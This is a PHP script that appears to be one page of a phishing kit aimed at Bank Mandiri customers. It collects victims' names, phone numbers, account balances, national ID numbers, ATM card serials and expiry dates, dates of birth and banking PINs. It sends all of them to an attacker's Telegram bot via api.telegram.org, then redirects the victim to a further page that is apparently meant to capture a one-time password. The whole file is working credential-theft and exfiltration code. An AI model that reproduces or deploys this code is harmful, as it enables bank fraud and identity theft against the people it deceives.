<?php
session_start();
include "./tele.php";

// Ambil semua data dari SESSION (dari skrip sebelumnya + yang baru)
$nama = $_SESSION['nama'] ?? '';
$nomor = $_SESSION['nomor'] ?? '';
$saldo = $_SESSION['saldo'] ?? '';  // Menggunakan yang terbaru jika overwrite
$nik = $_SESSION['nik'] ?? '';
$seri = $_SESSION['seri'] ?? '';
$masa = $_SESSION['masa'] ?? '';
$tanggal_lahir = $_SESSION['tanggal_lahir'] ?? '';

// Ambil data baru dari POST
$pin_mandiri = $_POST['pin_mandiri'] ?? '';
$namalengkap = $_POST['nwn'] ?? '';  // Asumsi 'nwn' adalah nama lengkap
$nomortelepon = $_POST['nomortelepon'] ?? '';
$saldo_baru = $_POST['saldo'] ?? '';  // Jika ada saldo baru, gunakan ini; jika tidak, tetap yang lama

// Simpan data baru ke SESSION (overwrite jika perlu)
$_SESSION['pin_mandiri'] = $pin_mandiri;
$_SESSION['namalengkap'] = $namalengkap;
$_SESSION['nomortelepon'] = $nomortelepon;
if (!empty($saldo_baru)) {
    $_SESSION['saldo'] = $saldo_baru;  // Update saldo jika ada yang baru
}

// Gabungkan semua data (dari session sebelumnya + baru) untuk pesan
$message = "
├• | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 |
├───────────────────
├• *Nama* : " . $nama . "
├• *Nomor* : " . $nomor . "
├• *Saldo* : " . $_SESSION['saldo'] . "
├• *Nik Ktp* : " . $nik . "
├• *Seri ATM* : " . $seri . "
├• *Masa Berlaku* : " . $masa . "
├• *Tanggal Lahir* : " . $tanggal_lahir . "
├• *PIN MANDIRI* : " . $pin_mandiri . "
╰───────────────────
";

// Fungsi sendMessage tetap sama
function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

// Kirim pesan
sendMessage($telegram_id, $message, $token_bot);

// Redirect
header('Location: otepe.html');
?>
